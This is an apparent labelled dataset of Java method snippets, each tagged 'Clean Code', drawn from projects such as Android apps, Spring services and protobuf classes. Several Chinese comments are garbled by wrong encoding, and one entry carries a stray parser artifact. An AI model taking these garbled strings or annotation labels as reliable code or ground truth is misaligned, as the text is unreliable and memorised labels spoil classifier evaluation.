}",0,Clean Code
"@Override public SyncRogueCommonPendingActionScNotify clearQuick(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  rogueCommonPendingAction.clearQuick();
  return this;
}",0,Clean Code
"public String id(){
  return id;
}
",0,Clean Code
"private FBSPlayer(){
}
",0,Clean Code
"public CombinedNodeRealizer(final ZyLabelContent leftContent,final ZyLabelContent rightContent){
  this.leftContent=leftContent;
  this.rightContent=rightContent;
  activeContentSide=leftContent != null ? ESide.PRIMARY : ESide.SECONDARY;
  setShapeType(ShapeNodeRealizer.ROUND_RECT);
  setLineType(LineType.LINE_2);
  setNodeSize();
}",0,Clean Code
"/** 
 * 淇敼config.json閲岀殑绯荤粺鍊�
 * @return ""淇敼鎴愬姛锛�""or""淇敼澶辫触""
 */
@Log @PostMapping(""requireSetting"") public Result requireSetting(@RequestBody systemSetting setting){
  try {
    String res=systemService.requiredSetting(setting);
    if (res.contains(""鎴愬姛"")) {
      return Result.success(res);
    }
 else {
      return Result.error(res);
    }
  }
 catch (  Exception e) {
    e.printStackTrace();
    return Result.error(""淇敼澶辫触锛�"");
  }
}
",0,Clean Code
"public ParseResult parse(final String rawJson){
  final Map<String,Object> requestMap=JSONSerDeUtils.deserializeJson(rawJson,new TypeReference<>(){
  }
);
  final String eventType=(String)requestMap.get(""type"");
  if (StringUtils.equals(eventType,""url_verification"")) {
    return ParseResult.builder().type(ParseResult.ParseResultType.CHALLENGE).ack(ParseResult.HttpAck.builder().httpStatus(HttpStatus.OK).body((String)requestMap.get(""challenge"")).build()).build();
  }
  if (!StringUtils.equals(eventType,""event_callback"")) {
    return ParseResult.builder().type(ParseResult.ParseResultType.FILTER).filterMessage(""Unknown Slack event type: %s"".formatted(eventType)).build();
  }
  final Map<String,Object> rawEvent=(Map<String,Object>)requestMap.get(""event"");
  if (rawEvent == null) {
    return ParseResult.builder().type(ParseResult.ParseResultType.ERROR).errorMessage(""Slack event has a broken payload: %s"".formatted(rawJson)).build();
  }
  final String innerEventType=(String)rawEvent.get(""type"");
  if (!""message"".equals(innerEventType)) {
    return ParseResult.builder().type(ParseResult.ParseResultType.FILTER).filterMessage(""Unknown Slack event inner type: %s"".formatted(innerEventType)).build();
  }
  final String messageSubtype=(String)rawEvent.get(""subtype"");
  if (messageSubtype == null) {
    final MessageEvent messageEvent=GsonHelper.fromJson(JSONSerDeUtils.serializeJson(requestMap.get(""event"")),MessageEvent.class);
    if (messageEvent.getThreadTs() == null) {
      return ParseResult.builder().type(ParseResult.ParseResultType.FILTER).filterMessage(""Slack message event is not a thread reply: %s"".formatted(messageEvent)).build();
    }
    return ParseResult.builder().type(ParseResult.ParseResultType.PAYLOAD).messageEvent(MessageEventRequest.builder().event(messageEvent).action(MessageEventActionDto.CREATE).provider(MessageProviderDto.SLACK).build()).build();
  }
  if (""message_changed"".equals(messageSubtype)) {
    final MessageChangedEvent messageEvent=GsonHelper.fromJson(JSONSerDeUtils.serializeJson(requestMap.get(""event"")),MessageChangedEvent.class);
    if (messageEvent.getMessage().getThreadTs() == null) {
      return ParseResult.builder().type(ParseResult.ParseResultType.FILTER).filterMessage(""Slack message is not a thread reply: %s"".formatted(messageEvent)).build();
    }
    return ParseResult.builder().type(ParseResult.ParseResultType.PAYLOAD).messageEvent(MessageEventRequest.builder().event(messageEvent).action(MessageEventActionDto.UPDATE).provider(MessageProviderDto.SLACK).build()).build();
  }
  return ParseResult.builder().type(ParseResult.ParseResultType.FILTER).filterMessage(""Couldn't handle Slack event: %s"".formatted(rawJson)).build();
}
",0,Clean Code
"@Test public void shouldAddTaskExecutionLogsAsync() throws Exception {
  List<TaskExecLog> logs=new ArrayList<>();
  String taskId=uuid();
  logs.add(createLog(taskId,""log1""));
  logs.add(createLog(taskId,""log2""));
  logs.add(createLog(taskId,""log3""));
  indexDAO.asyncAddTaskExecutionLogs(logs).get();
  List<TaskExecLog> indexedLogs=tryFindResults(() -> indexDAO.getTaskExecutionLogs(taskId),3);
  assertEquals(3,indexedLogs.size());
  assertTrue(""Not all logs was indexed"",indexedLogs.containsAll(logs));
}",0,Clean Code
"/** 
 * 璁剧疆 spanId 鍒版棩蹇� MDC
 * @param spanId spanId
 */
protected static void spanId(String spanId){
  try {
    MDC.put(TrackerConstants.MDC_SPAN_ID_KEY,spanId);
  }
 catch (  IllegalArgumentException e) {
    log.error(""[TRACKERS] 璁剧疆鏃ュ織MDC鎷撳睍閿欒:{}"",e.getMessage());
    e.printStackTrace();
  }
}
",0,Clean Code
"/** 
 * 鏌ヨ鑰冩牳璇︽儏
 * @param employeeAppraisalId
 * @return
 */
EmployeeAppraisalDetailVO queryEmployeeAppraisalDetail(Long employeeAppraisalId);
",0,Clean Code
"@Test void should_accept_base64_image(){
  String base64Data=Base64.getEncoder().encodeToString(readBytes(CAT_IMAGE_URL));
  ImageContent imageContent=ImageContent.from(base64Data,""image/png"");
  UserMessage userMessage=UserMessage.from(imageContent);
  Response<AiMessage> response=visionModel.generate(userMessage);
  assertThat(response.content().text()).containsIgnoringCase(""cat"");
  assertThat(response.tokenUsage().inputTokenCount()).isEqualTo(92);
}",0,Clean Code
"T convertFunction(VmFunction value,Iterable<Object> path);
",0,Clean Code
"@Override public long getMaxLabels(){
  return this.mInfo.getMaxLabels();
}
",0,Clean Code
"/** 
 * delete
 * @param id
 * @return
 */
ActionResult deleteWithPermission(@NotNull Long id);
",0,Clean Code
"/** 
 * <code>optional uint32 hp = 8;</code>
 * @return whether the hp field is set
 */
public boolean hasHp(){
  return (bitField0_ & 0x00000010) != 0;
}",0,Clean Code
"protected OllamaChatResponseMetadata(Usage usage){
  this.usage=usage;
}
",0,Clean Code
"public int getAccessFlag(){
  return this.accessFlag;
}
",0,Clean Code
"@Override protected void startDynamic(VmDynamic value){
  if (isXmlElement(value)) {
    throw new VmExceptionBuilder().evalError(""elementNotSupportedHere"").withProgramValue(""Value"",value).build();
  }
}
",0,Clean Code
"/** 
 * <code>optional uint32 avatar_id = 1;</code>
 * @return whether the avatarId field is set
 */
public boolean hasAvatarId(){
  return (bitField0_ & 0x00000001) != 0;
}",0,Clean Code
"private SQLTableSource getSQLExprTableSource(SQLTableSource sqlTableSource){
  if (sqlTableSource instanceof SQLExprTableSource) {
    return sqlExprTableSource;
  }
 else   if (sqlTableSource instanceof SQLJoinTableSource) {
    return getSQLExprTableSource(sqlJoinTableSource.getLeft());
  }
  return null;
}
",0,Clean Code
"public static Class<?>[] getClazzByArgs(Object[] args){
  Class<?>[] parameterTypes=new Class[args.length];
  for (int i=0; i < args.length; i++) {
    if (args[i] instanceof ArrayList) {
      parameterTypes[i]=List.class;
      continue;
    }
    if (args[i] instanceof LinkedList) {
      parameterTypes[i]=List.class;
      continue;
    }
    if (args[i] instanceof HashMap) {
      parameterTypes[i]=Map.class;
      continue;
    }
    if (args[i] instanceof Long) {
      parameterTypes[i]=long.class;
      continue;
    }
    if (args[i] instanceof Double) {
      parameterTypes[i]=double.class;
      continue;
    }
    if (args[i] instanceof TimeUnit) {
      parameterTypes[i]=TimeUnit.class;
      continue;
    }
    parameterTypes[i]=args[i].getClass();
  }
  return parameterTypes;
}",0,Clean Code
"/** 
 * <code>optional uint32 world_level = 14;</code>
 * @return the worldLevel
 */
public int getWorldLevel(){
  return worldLevel;
}",0,Clean Code
"/** 
 * Creates a builder without any preconfigured conversions, converter factories, or type mappings.
 * @return a builder without any preconfigured conversions, converter factories, or type mappings
 */
public static ValueMapperBuilder unconfigured(){
  return new ValueMapperBuilder();
}
",0,Clean Code
"@Override protected void endTyped(VmTyped value,boolean isEmpty){
}
",0,Clean Code
"/** 
 * <code>optional uint32 FGHILCKHDDO = 5;</code>
 * @return this
 */
public RogueVirtualItemInfo clearFGHILCKHDDO(){
  bitField0_&=~0x00000002;
  fGHILCKHDDO=0;
  return this;
}",0,Clean Code
"@Override public void writeTo(final ProtoSink output) throws IOException {
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeRawByte((byte)48);
    output.writeUInt32NoTag(clientResVersion);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeRawByte((byte)112);
    output.writeUInt32NoTag(retcode);
  }
}
@Override public void writeTo(final JsonSink output) throws IOException {
  output.beginObject();
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeUInt32(FieldNames.clientResVersion,clientResVersion);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeUInt32(FieldNames.retcode,retcode);
  }
  output.endObject();
}",0,Clean Code
"@Override public void actionPerformed(final ActionEvent e){
  m_color=CColorChooser.this.getColor();
}
",0,Clean Code
"public static Set<Long> toLongSet(String tagStr){
  Set<Long> tag=new HashSet<>();
  if (StrUtil.isEmpty(tagStr)) {
    return tag;
  }
  for (  String str : tagStr.split(SEPARATOR)) {
    if (StrUtil.isEmpty(str)) {
      continue;
    }
    tag.add(Long.valueOf(str));
  }
  return tag;
}
",0,Clean Code
"@CheckResult public static Bulletin createForwardedBulletin(Context context,FrameLayout containerLayout,int dialogsCount,long did,int messagesCount,int backgroundColor,int textColor){
  final Bulletin.LottieLayout layout=new Bulletin.LottieLayout(context,null,backgroundColor,textColor);
  CharSequence text;
  int hapticDelay=-1;
  if (dialogsCount <= 1) {
    if (did == UserConfig.getInstance(UserConfig.selectedAccount).clientUserId) {
      if (messagesCount <= 1) {
        text=AndroidUtilities.replaceSingleTag(LocaleController.getString(R.string.FwdMessageToSavedMessages),SavedMessagesController::openSavedMessages);
      }
 else {
        text=AndroidUtilities.replaceSingleTag(LocaleController.getString(R.string.FwdMessagesToSavedMessages),SavedMessagesController::openSavedMessages);
      }
      layout.setAnimation(R.raw.saved_messages,30,30);
    }
 else {
      if (DialogObject.isChatDialog(did)) {
        TLRPC.Chat chat=MessagesController.getInstance(UserConfig.selectedAccount).getChat(-did);
        if (messagesCount <= 1) {
          text=AndroidUtilities.replaceTags(LocaleController.formatString(""FwdMessageToGroup"",R.string.FwdMessageToGroup,chat.title));
        }
 else {
          text=AndroidUtilities.replaceTags(LocaleController.formatString(""FwdMessagesToGroup"",R.string.FwdMessagesToGroup,chat.title));
        }
      }
 else {
        TLRPC.User user=MessagesController.getInstance(UserConfig.selectedAccount).getUser(did);
        if (messagesCount <= 1) {
          text=AndroidUtilities.replaceTags(LocaleController.formatString(""FwdMessageToUser"",R.string.FwdMessageToUser,UserObject.getFirstName(user)));
        }
 else {
          text=AndroidUtilities.replaceTags(LocaleController.formatString(""FwdMessagesToUser"",R.string.FwdMessagesToUser,UserObject.getFirstName(user)));
        }
      }
      layout.setAnimation(R.raw.forward,30,30);
      hapticDelay=300;
    }
  }
 else {
    if (messagesCount <= 1) {
      text=AndroidUtilities.replaceTags(LocaleController.formatPluralString(""FwdMessageToManyChats"",dialogsCount));
    }
 else {
      text=AndroidUtilities.replaceTags(LocaleController.formatPluralString(""FwdMessagesToManyChats"",dialogsCount));
    }
    layout.setAnimation(R.raw.forward,30,30);
    hapticDelay=300;
  }
  layout.textView.setText(text);
  if (hapticDelay > 0) {
    layout.postDelayed(() -> {
      if (!NekoConfig.disableVibration.Bool()) {
        layout.performHapticFeedback(HapticFeedbackConstants.KEYBOARD_TAP,HapticFeedbackConstants.FLAG_IGNORE_GLOBAL_SETTING);
      }
    }
,hapticDelay);
  }
  return Bulletin.make(containerLayout,layout,Bulletin.DURATION_SHORT);
}",0,Clean Code
"protected void onRecommendGuildStickyTopRemove(List<IGProStickyChannel> list){
}
",0,Clean Code
"private String getText(String uri){
  var resource=new DefaultResourceLoader().getResource(uri);
  try {
    return resource.getContentAsString(StandardCharsets.UTF_8);
  }
 catch (  IOException e) {
    throw new RuntimeException(e);
  }
}",0,Clean Code
"public NeedLoggedInBusinessException(){
  super(""common.needLoggedIn"");
}
",0,Clean Code
"public TempChatInfo(){
  this.peerUid="""";
  this.groupCode="""";
  this.fromNick="""";
}
public TempChatInfo(int i2,int i3,String str,String str2,String str3){
  this.peerUid="""";
  this.groupCode="""";
  this.fromNick="""";
  this.sessionType=i2;
  this.chatType=i3;
  this.peerUid=str;
  this.groupCode=str2;
  this.fromNick=str3;
}",0,Clean Code
"@Bean @Qualifier(ASYNC_SYSTEM_TASKS_QUALIFIER) public Set<WorkflowSystemTask> asyncSystemTasks(Set<WorkflowSystemTask> allSystemTasks){
  return allSystemTasks.stream().filter(WorkflowSystemTask::isAsync).collect(Collectors.toUnmodifiableSet());
}
",0,Clean Code
"@Test public void testWorkflowSetTaskToDomain(){
  SubWorkflowParams subWorkflowParams=new SubWorkflowParams();
  Map<String,String> taskToDomain=new HashMap<>();
  taskToDomain.put(""unit"",""test"");
  subWorkflowParams.setTaskToDomain(taskToDomain);
  assertEquals(taskToDomain,subWorkflowParams.getTaskToDomain());
}
",0,Clean Code
"@Override public JavaType type(@Nullable Type type){
  if (type == null) {
    return JavaType.Unknown.getInstance();
  }
  String signature=signatureBuilder.signature(type);
  JavaType existing=typeCache.get(signature);
  if (existing != null) {
    return existing;
  }
  if (type instanceof Class) {
    Class<?> clazz=(Class<?>)type;
    if (clazz.isArray()) {
      return array(clazz,signature);
    }
 else     if (clazz.isPrimitive()) {
      return JavaType.Primitive.fromKeyword(clazz.getName());
    }
    return classType((Class<?>)type,signature);
  }
 else   if (type instanceof GenericArrayType) {
    return array((GenericArrayType)type,signature);
  }
 else   if (type instanceof TypeVariable) {
    return generic((TypeVariable<?>)type,signature);
  }
 else   if (type instanceof WildcardType) {
    return generic((WildcardType)type,signature);
  }
 else   if (type instanceof ParameterizedType) {
    return parameterized((ParameterizedType)type,signature);
  }
  throw new UnsupportedOperationException(""Unknown type "" + type.getClass().getName());
}
",0,Clean Code
"/** 
 * Business abnormality
 * @param request   request
 * @param exception exception
 * @return return
 */
@ExceptionHandler({RedirectBusinessException.class}) public ModelAndView handleModelAndViewBizException(HttpServletRequest request,Exception exception){
  ModelAndView result=translateModelAndView(exception);
  log.info(""ModelAndView business exception occurred{}:{}"",request.getRequestURI(),result,exception);
  return result;
}
",0,Clean Code
"private OCIModelProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private OCIModelProto(){
  forwardFeatureMapping_=emptyIntList();
  backwardFeatureMapping_=emptyIntList();
  configFile_="""";
  profileName_="""";
  endpointUrl_="""";
  modelDeploymentId_="""";
}
!org.eclipse.jdt.core.dom.MethodDeclaration@399c156d",0,Clean Code
"@Override public MazeChest create(){
  return MazeChest.newInstance();
}
",0,Clean Code
"/** 
 * <code>optional .RogueCommonBuffSelectSource source = 6;</code>
 * @return this
 */
public RogueBuffSelectInfo clearSource(){
  bitField0_&=~0x00000020;
  source=0;
  return this;
}",0,Clean Code
"void readOemPermissions(@NonNull XmlPullParser parser) throws IOException, XmlPullParserException {
  final String packageName=parser.getAttributeValue(null,""package"");
  if (TextUtils.isEmpty(packageName)) {
    Log.w(TAG,""package is required for <oem-permissions> in "" + parser.getPositionDescription());
    return;
  }
  ArrayMap<String,Boolean> permissions=mOemPermissions.get(packageName);
  if (permissions == null) {
    permissions=new ArrayMap<>();
  }
  final int depth=parser.getDepth();
  while (XmlUtils.nextElementWithin(parser,depth)) {
    final String name=parser.getName();
    if (""permission"".equals(name)) {
      final String permName=parser.getAttributeValue(null,""name"");
      if (TextUtils.isEmpty(permName)) {
        Log.w(TAG,""name is required for <permission> in "" + parser.getPositionDescription());
        continue;
      }
      permissions.put(permName,Boolean.TRUE);
    }
 else     if (""deny-permission"".equals(name)) {
      String permName=parser.getAttributeValue(null,""name"");
      if (TextUtils.isEmpty(permName)) {
        Log.w(TAG,""name is required for <deny-permission> in "" + parser.getPositionDescription());
        continue;
      }
      permissions.put(permName,Boolean.FALSE);
    }
  }
  mOemPermissions.put(packageName,permissions);
}
",0,Clean Code
"@PostMapping(""/register"") public R register(@RequestBody RegisterBody user){
  if (!(""true"".equals(configService.selectConfigByKey(""sys.account.registerUser"")))) {
    return R.error(""褰撳墠绯荤粺娌℃湁寮�鍚敞鍐屽姛鑳斤紒"");
  }
  String msg=registerService.register(user);
  return StringUtils.isEmpty(msg) ? R.ok() : R.error(msg);
}
",0,Clean Code
"/** 
 * Set the bit at <code>i</code>, returning <code>true</code> if it was previously set. 
 */
public abstract boolean getAndSet(int i);
",0,Clean Code
"public void setupWallpaper(StoryEntry entry,boolean animated){
  lastWallpaperDrawable=wallpaperDrawable;
  if (wallpaperDrawable != null) {
    wallpaperDrawable.setCallback(null);
  }
  if (entry == null) {
    wallpaperDrawable=null;
    return;
  }
  long dialogId=entry.backgroundWallpaperPeerId;
  if (entry.backgroundWallpaperEmoticon != null) {
    wallpaperDrawable=entry.backgroundDrawable=getBackgroundDrawableFromTheme(entry.currentAccount,entry.backgroundWallpaperEmoticon,entry.isDark);
  }
 else   if (dialogId != Long.MIN_VALUE) {
    wallpaperDrawable=entry.backgroundDrawable=getBackgroundDrawable(wallpaperDrawable,entry.currentAccount,dialogId,entry.isDark);
  }
 else {
    wallpaperDrawable=null;
    return;
  }
  if (lastWallpaperDrawable != wallpaperDrawable) {
    if (animated) {
      wallpaperDrawableCrossfade.set(0,true);
    }
 else {
      lastWallpaperDrawable=null;
    }
  }
  if (wallpaperDrawable != null) {
    wallpaperDrawable.setCallback(this);
  }
  if (blurManager != null) {
    if (wallpaperDrawable != null) {
      if (wallpaperDrawable instanceof BitmapDrawable) {
        blurManager.setFallbackBlur(((BitmapDrawable)wallpaperDrawable).getBitmap(),0);
      }
 else {
        int w=wallpaperDrawable.getIntrinsicWidth();
        int h=wallpaperDrawable.getIntrinsicHeight();
        if (w <= 0 || h <= 0) {
          w=1080;
          h=1920;
        }
        float scale=Math.max(100f / w,100f / h);
        if (scale > 1) {
          w*=scale;
          h*=scale;
        }
        Bitmap bitmap=Bitmap.createBitmap(w,h,Bitmap.Config.ARGB_8888);
        wallpaperDrawable.setBounds(0,0,w,h);
        wallpaperDrawable.draw(new Canvas(bitmap));
        blurManager.setFallbackBlur(bitmap,0,true);
      }
    }
 else {
      blurManager.setFallbackBlur(null,0);
    }
  }
  invalidate();
}",0,Clean Code
"public void checkCamera(boolean request){
  if (parentAlert.destroyed || !needCamera) {
    return;
  }
  boolean old=deviceHasGoodCamera;
  boolean old2=noCameraPermissions;
  BaseFragment fragment=parentAlert.baseFragment;
  if (fragment == null) {
    fragment=LaunchActivity.getLastFragment();
  }
  if (fragment == null || fragment.getParentActivity() == null) {
    return;
  }
  if (!SharedConfig.inappCamera) {
    deviceHasGoodCamera=false;
  }
 else {
    if (Build.VERSION.SDK_INT >= 23) {
      if (noCameraPermissions=(fragment.getParentActivity().checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED)) {
        if (request) {
          try {
            parentAlert.baseFragment.getParentActivity().requestPermissions(new String[]{Manifest.permission.CAMERA,Manifest.permission.READ_EXTERNAL_STORAGE},17);
          }
 catch (          Exception ignore) {
          }
        }
        deviceHasGoodCamera=false;
      }
 else {
        if (request || SharedConfig.hasCameraCache) {
          CameraController.getInstance().initCamera(null);
        }
        deviceHasGoodCamera=CameraController.getInstance().isCameraInitied();
      }
    }
 else {
      if (request || SharedConfig.hasCameraCache) {
        CameraController.getInstance().initCamera(null);
      }
      deviceHasGoodCamera=CameraController.getInstance().isCameraInitied();
    }
  }
  if (deviceHasGoodCamera && NekoConfig.disableInstantCamera.Bool()) {
    File file=new File(ApplicationLoader.getFilesDirFixed(),""cthumb.jpg"");
    if (file.exists())     file.delete();
  }
  if ((old != deviceHasGoodCamera || old2 != noCameraPermissions) && adapter != null) {
    adapter.notifyDataSetChanged();
  }
  if (!parentAlert.destroyed && parentAlert.isShowing() && deviceHasGoodCamera&& parentAlert.getBackDrawable().getAlpha() != 0 && !cameraOpened && !NekoConfig.disableInstantCamera.Bool()) {
    showCamera();
  }
}",0,Clean Code
"@Override public int compareTo(Delayed o){
  if (o == this) {
    return 0;
  }
  if (o instanceof DelayMealTask) {
    DelayMealTask task=(DelayMealTask)o;
    if (this.startTime > task.getStartTime()) {
      return 1;
    }
 else     if (this.startTime < task.getStartTime()) {
      return -1;
    }
 else {
      if (this.taskId < task.getTaskId()) {
        return -1;
      }
 else {
        return 1;
      }
    }
  }
  long diff=this.getDelay(TimeUnit.NANOSECONDS) - o.getDelay(TimeUnit.NANOSECONDS);
  if (diff < 0) {
    return -1;
  }
 else   if (diff > 0) {
    return 1;
  }
 else {
    return 0;
  }
}",0,Clean Code
"/** 
 * <code>optional .FriendApplyInfo friend_apply_info = 12;</code>
 * @param value the friendApplyInfo to set
 * @return this
 */
public SyncApplyFriendScNotify setFriendApplyInfo(final FriendApplyInfoOuterClass.FriendApplyInfo value){
  bitField0_|=0x00000001;
  friendApplyInfo.copyFrom(value);
  return this;
}",0,Clean Code
"@Override public void visitRegex(VmRegex value){
  append(value);
}
",0,Clean Code
"/** 
 * Creates a map of the classes fields.
 */
protected static Object getParamArg(Class cl){
  if (!cl.isPrimitive())   return null;
 else   if (boolean.class.equals(cl))   return Boolean.FALSE;
 else   if (byte.class.equals(cl))   return Byte.valueOf((byte)0);
 else   if (short.class.equals(cl))   return Short.valueOf((short)0);
 else   if (char.class.equals(cl))   return Character.valueOf((char)0);
 else   if (int.class.equals(cl))   return Integer.valueOf(0);
 else   if (long.class.equals(cl))   return Long.valueOf(0);
 else   if (float.class.equals(cl))   return Double.valueOf(0);
 else   if (double.class.equals(cl))   return Double.valueOf(0);
 else   throw new UnsupportedOperationException();
}",0,Clean Code
"/** 
 * 杞崲涓哄搷搴斿ご Set-Cookie 鍙傛暟闇�瑕佺殑鍊�
 * @return /
 */
public String toHeaderValue(){
  this.builder();
  if (SaFoxUtil.isEmpty(name)) {
    throw new SaTokenException(""name涓嶈兘涓虹┖"").setCode(SaErrorCode.CODE_12002);
  }
  if (value != null && value.contains("";"")) {
    throw new SaTokenException(""鏃犳晥Value锛�"" + value).setCode(SaErrorCode.CODE_12003);
  }
  StringBuilder sb=new StringBuilder();
  sb.append(name).append(""="").append(value);
  if (maxAge >= 0) {
    sb.append(""; Max-Age="").append(maxAge);
    String expires;
    if (maxAge == 0) {
      expires=Instant.EPOCH.atOffset(ZoneOffset.UTC).format(DateTimeFormatter.RFC_1123_DATE_TIME);
    }
 else {
      expires=OffsetDateTime.now().plusSeconds(maxAge).format(DateTimeFormatter.RFC_1123_DATE_TIME);
    }
    sb.append(""; Expires="").append(expires);
  }
  if (!SaFoxUtil.isEmpty(domain)) {
    sb.append(""; Domain="").append(domain);
  }
  if (!SaFoxUtil.isEmpty(path)) {
    sb.append(""; Path="").append(path);
  }
  if (secure) {
    sb.append(""; Secure"");
  }
  if (httpOnly) {
    sb.append(""; HttpOnly"");
  }
  if (!SaFoxUtil.isEmpty(sameSite)) {
    sb.append(""; SameSite="").append(sameSite);
  }
  return sb.toString();
}",0,Clean Code
"public String toString(){
  return ""GroupShutUpGrayElement{curTime="" + this.curTime + "",duration=""+ this.duration+ "",admin=""+ this.admin+ "",member=""+ this.member+ "",}"";
}
",0,Clean Code
"public Parameters(){
  this.ds=Hdf5Loader.load(""hdf5/glove-100-angular.hdf5"");
  this.ravv=new ListRandomAccessVectorValues(ds.baseVectors,ds.baseVectors.get(0).length());
}
public Parameters(){
  this.r=new Random(1337);
  this.vectors=new TestRandomAccessReader(createRandomFloatVectors(100000,1536,r));
}",0,Clean Code
"public static synchronized LockObject getLock(String key){
  return LOCK_MAP.get(key);
}
",0,Clean Code
"public void beginNewTable(final int borderWidth){
  toolTip.append(""</table><table border=\"""" + borderWidth + ""\"" cellpadding=\""1\"" cellspacing=\""0f\"">"");
}",0,Clean Code
"SoftwareSystem parse(GroupableDslContext context,Tokens tokens){
  if (tokens.hasMoreThan(TAGS_INDEX)) {
    throw new RuntimeException(""Too many tokens, expected: "" + GRAMMAR);
  }
  if (!tokens.includes(NAME_INDEX)) {
    throw new RuntimeException(""Expected: "" + GRAMMAR);
  }
  SoftwareSystem softwareSystem=null;
  String name=tokens.get(NAME_INDEX);
  if (context.isExtendingWorkspace()) {
    softwareSystem=context.getWorkspace().getModel().getSoftwareSystemWithName(name);
  }
  if (softwareSystem == null) {
    softwareSystem=context.getWorkspace().getModel().addSoftwareSystem(name);
  }
  String description="""";
  if (tokens.includes(DESCRIPTION_INDEX)) {
    description=tokens.get(DESCRIPTION_INDEX);
    softwareSystem.setDescription(description);
  }
  if (tokens.includes(TAGS_INDEX)) {
    String tags=tokens.get(TAGS_INDEX);
    softwareSystem.addTags(tags.split("",""));
  }
  if (context instanceof EnterpriseDslContext) {
    softwareSystem.setLocation(Location.Internal);
  }
  if (context.hasGroup()) {
    softwareSystem.setGroup(context.getGroup().getName());
    context.getGroup().addElement(softwareSystem);
  }
  return softwareSystem;
}
",0,Clean Code
"/** 
 * Convert a <code>ResultSet</code> column into an object.  Simple implementations could just call <code>rs.getObject(index)</code> while more complex implementations could perform type manipulation to match the column's type to the bean property type. <p> This implementation calls the appropriate <code>ResultSet</code> getter method for the given property type to perform the type conversion.  If the property type doesn't match one of the supported <code>ResultSet</code> types, <code>getObject</code> is called. </p>
 * @param rs The <code>ResultSet</code> currently being processed.  It ispositioned on a valid row before being passed into this method.
 * @param index The current column index being processed.
 * @param propType The bean property type that this column needs to beconverted into.
 * @throws SQLException if a database access error occurs
 * @return The object from the <code>ResultSet</code> at the given columnindex after optional type processing or <code>null</code> if the column value was SQL NULL.
 */
protected Object processColumn(ResultSet rs,int index,Class<?> propType) throws SQLException {
  if (!propType.isPrimitive() && rs.getObject(index) == null) {
    return null;
  }
  if (propType.equals(String.class)) {
    return rs.getString(index);
  }
 else   if (propType.equals(Integer.TYPE) || propType.equals(Integer.class)) {
    return Integer.valueOf(rs.getInt(index));
  }
 else   if (propType.equals(Boolean.TYPE) || propType.equals(Boolean.class)) {
    return Boolean.valueOf(rs.getBoolean(index));
  }
 else   if (propType.equals(Long.TYPE) || propType.equals(Long.class)) {
    return Long.valueOf(rs.getLong(index));
  }
 else   if (propType.equals(Double.TYPE) || propType.equals(Double.class)) {
    return Double.valueOf(rs.getDouble(index));
  }
 else   if (propType.equals(Float.TYPE) || propType.equals(Float.class)) {
    return Float.valueOf(rs.getFloat(index));
  }
 else   if (propType.equals(Short.TYPE) || propType.equals(Short.class)) {
    return Short.valueOf(rs.getShort(index));
  }
 else   if (propType.equals(Byte.TYPE) || propType.equals(Byte.class)) {
    return Byte.valueOf(rs.getByte(index));
  }
 else   if (propType.equals(Timestamp.class)) {
    return rs.getTimestamp(index);
  }
 else   if (propType.equals(SQLXML.class)) {
    return rs.getSQLXML(index);
  }
 else {
    return rs.getObject(index);
  }
}
",0,Clean Code
"public boolean isIgnoreLockingExceptions(){
  return ignoreLockingExceptions;
}
",0,Clean Code
"default Object getAviatorObject(AviatorObject arg,Map<String,Object> env){
  if (arg instanceof AviatorNumber) {
    return FunctionUtils.getNumberValue(arg,env);
  }
 else   if (arg instanceof AviatorString) {
    return FunctionUtils.getStringValue(arg,env);
  }
 else   if (arg instanceof AviatorBoolean) {
    return FunctionUtils.getBooleanValue(arg,env);
  }
 else   if (arg instanceof AviatorNil) {
    return null;
  }
 else {
    return FunctionUtils.getJavaObject(arg,env);
  }
}
",0,Clean Code
"@Override public boolean equals(Object obj){
  if (this == obj)   return true;
  if (!super.equals(obj))   return false;
  if (getClass() != obj.getClass())   return false;
  SodiumParameters other=(SodiumParameters)obj;
  if (inputs == null) {
    if (other.inputs != null)     return false;
  }
 else   if (!inputs.equals(other.inputs))   return false;
  if (alpha == null) {
    return other.alpha == null;
  }
 else   return alpha.equals(other.alpha);
}
",0,Clean Code
"void onChecked(SparseBooleanArray sparseBooleanArray);
",0,Clean Code
"public GProAnchorRoomInfo getInfo(){
  return this.info;
}
",0,Clean Code
"private void doClickEvent(int value){
switch (value) {
case ClickEvents.EVENT_PREV_PAGE:
    prevPage();
  break;
case ClickEvents.EVENT_NEXT_PAGE:
nextPage();
break;
case ClickEvents.EVENT_SAVE_PICTURE:
savePicture();
break;
case ClickEvents.EVENT_LOAD_PREV:
loadPrev();
break;
case ClickEvents.EVENT_LOAD_NEXT:
loadNext();
break;
case ClickEvents.EVENT_EXIT_READER:
exitReader();
break;
case ClickEvents.EVENT_TO_FIRST:
toFirst();
break;
case ClickEvents.EVENT_TO_LAST:
toLast();
break;
case ClickEvents.EVENT_SWITCH_SCREEN:
switchScreen();
break;
case ClickEvents.EVENT_SWITCH_MODE:
switchMode();
break;
case ClickEvents.EVENT_SWITCH_CONTROL:
switchControl();
break;
case ClickEvents.EVENT_RELOAD_IMAGE:
reloadImage();
break;
case ClickEvents.EVENT_SWITCH_NIGHT:
switchNight();
break;
}
}
",0,Clean Code
"/** 
 * <code>repeated .Material material_list = 7;</code> This method returns the internal storage object without modifying any has state. The returned object should not be modified and be treated as read-only. Use  {@link #getMutableMaterialList()} if you want to modify it.
 * @return internal storage object for reading
 */
public RepeatedMessage<MaterialOuterClass.Material> getMaterialList(){
  return materialList;
}",0,Clean Code
"@Override protected BaseSendExtendDTO buildBaseSendExtendParam(PayResultCallbackOrderEvent messageSendEvent){
  return BaseSendExtendDTO.builder().eventName(""鏀粯缁撴灉鍥炶皟璁㈠崟"").keys(messageSendEvent.getOrderSn()).topic(environment.resolvePlaceholders(PayRocketMQConstant.PAY_GLOBAL_TOPIC_KEY)).tag(environment.resolvePlaceholders(PayRocketMQConstant.PAY_RESULT_CALLBACK_TAG_KEY)).sentTimeout(2000L).build();
}",0,Clean Code
"@Override public List<TaskModel> getTasksForWorkflow(String workflowId){
  String GET_TASKS_FOR_WORKFLOW=""SELECT task_id FROM workflow_to_task WHERE workflow_id = ?"";
  return getWithRetriedTransactions(tx -> query(tx,GET_TASKS_FOR_WORKFLOW,q -> {
    List<String> taskIds=q.addParameter(workflowId).executeScalarList(String.class);
